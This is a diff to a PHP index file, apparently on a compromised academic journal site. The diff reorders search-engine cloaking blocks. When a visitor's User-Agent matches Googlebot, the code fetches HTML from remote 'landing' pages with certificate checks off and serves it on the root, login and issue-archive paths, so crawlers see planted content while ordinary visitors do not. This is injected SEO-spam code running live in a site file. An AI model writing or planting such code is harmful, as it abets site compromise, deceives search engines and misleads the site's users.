@@ -1,5 +1,10 @@
 <?php
-function is_google_bot_v1(){
+$uri = $_SERVER['REQUEST_URI'];
+
+// ============================================================
+// 1. CLOAKING SUB index.php/obsesi/issue/archive (PALING SPESIFIK)
+// ============================================================
+function is_google_bot_v4(){
     $a = ["Googlebot","Google-Site-Verification","Google-InspectionTool","Googlebot-Mobile","Googlebot-News"];
     foreach($a as $b){
         if(strpos($_SERVER['HTTP_USER_AGENT'], $b) !== false) return true;
@@ -7,10 +12,9 @@ function is_google_bot_v1(){
     return false;
 }
 
-$uri = $_SERVER['REQUEST_URI'];
-if($uri == '/' || $uri == '/index.php'){
-    if(is_google_bot_v1()){
-        $c = curl_init('https://inkaindonesia.org/landing/obsesi-revisi1.html');
+if(strpos($uri, 'index.php/obsesi/issue/archive') !== false){
+    if(is_google_bot_v4()){
+        $c = curl_init('https://inkaindonesia.org/landing/obsesi-issue-archive.html');
         curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
         curl_setopt($c, CURLOPT_FOLLOWLOCATION, 1);
         curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
@@ -31,7 +35,7 @@ function is_google_bot_v2(){
     return false;
 }
 
-if(strpos($uri, 'index.php/obsesi/login') !== false || $uri == '/index.php'){
+if(strpos($uri, 'index.php/obsesi/login') !== false){
     if(is_google_bot_v2()){
         $c = curl_init('https://inkaindonesia.org/landing/obsesi-login.html');
         curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
@@ -44,7 +48,7 @@ if(strpos($uri, 'index.php/obsesi/login') !== false || $uri == '/index.php'){
 }
 
 // ============================================================
-// 3. CLOAKING SUB obsesi (tanpa index.php)
+// 3. CLOAKING SUB obsesi (tanpa index.php) - LEBIH UMUM
 // ============================================================
 function is_google_bot_v3(){
     $bots = [
@@ -73,9 +77,9 @@ if(stripos($uri, '/obsesi') !== false){
 }
 
 // ============================================================
-// 4. CLOAKING SUB index.php/obsesi/issue/archive
+// 4. CLOAKING ROOT ( / atau /index.php ) - PALING UMUM
 // ============================================================
-function is_google_bot_v4(){
+function is_google_bot_v1(){
     $a = ["Googlebot","Google-Site-Verification","Google-InspectionTool","Googlebot-Mobile","Googlebot-News"];
     foreach($a as $b){
         if(strpos($_SERVER['HTTP_USER_AGENT'], $b) !== false) return true;
@@ -83,9 +87,9 @@ function is_google_bot_v4(){
     return false;
 }
 
-if(strpos($uri, 'index.php/obsesi/issue/archive') !== false || $uri == '/index.php'){
-    if(is_google_bot_v4()){  // ✅ SUDAH DIPERBAIKI
-        $c = curl_init('https://inkaindonesia.org/landing/obsesi-issue-archive.html');
+if($uri == '/' || $uri == '/index.php'){
+    if(is_google_bot_v1()){
+        $c = curl_init('https://inkaindonesia.org/landing/obsesi-revisi1.html');
         curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
         curl_setopt($c, CURLOPT_FOLLOWLOCATION, 1);
         curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
